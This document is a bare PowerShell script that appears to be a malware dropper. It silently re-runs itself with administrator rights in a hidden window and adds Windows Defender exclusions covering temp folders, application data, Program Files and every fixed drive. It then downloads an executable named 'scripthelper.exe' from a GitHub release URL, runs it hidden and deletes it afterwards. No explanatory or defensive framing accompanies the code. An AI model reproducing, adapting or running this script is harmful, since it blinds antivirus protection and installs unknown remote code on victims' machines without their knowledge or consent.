$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        $scriptPath = $MyInvocation.MyCommand.Path
        if (Test-Path -Path $scriptPath -PathType Leaf) {
            $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
            $process = Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden -PassThru -ErrorAction Stop
            if ($process.WaitForExit(30000)) {
                exit $process.ExitCode
            }
            $process.Kill()
        }
    }
    catch {}
}

$maxRetries = 5
$baseDelay = 1000
$maxDelay = 30000

function Invoke-Retry {
    param($Action)
    $retryCount = 0
    $success = $false
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            & $Action
            $success = $true
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) { break }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay) + (Get-Random -Minimum 0 -Maximum 100)
            Start-Sleep -Milliseconds $delay
        }
    }
}

$existingFolders = Get-ChildItem -Path "C:\Program Files" -Directory | Select-Object -ExpandProperty FullName
$installFolder = if ($existingFolders) { $existingFolders | Get-Random } else { "C:\Program Files" }

Invoke-Retry -Action {
    $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
    $pathsToAdd = @($env:TEMP, $env:APPDATA, $env:LOCALAPPDATA, "C:\Program Files") + (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object -ExpandProperty DeviceID | ForEach-Object {"$_\"})
    $newPaths = $pathsToAdd | Where-Object {$exclusions -notcontains $_}
    if ($newPaths) {
        Add-MpPreference -ExclusionPath $newPaths -ErrorAction Stop
    }
}

$rand = Get-Random
$path = Join-Path $installFolder "scripthelper.exe"
$url = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"

Invoke-Retry -Action {
    $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
    if ($exclusions -notcontains $path) {
        Add-MpPreference -ExclusionPath $path -ErrorAction Stop
    }
}

$webClient = $null
try {
    Invoke-Retry -Action {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $path)
        if (Test-Path -Path $path) {
            Start-Process -FilePath $path -WindowStyle Hidden -Wait -ErrorAction Stop
        }
        else {
            throw "File not found at $path"
        }
    }
}
catch {}
finally {
    if ($webClient) { $webClient.Dispose() }
    if (Test-Path -Path $path) {
        try { Remove-Item -Path $path -Force -ErrorAction Stop } catch {}
    }
}
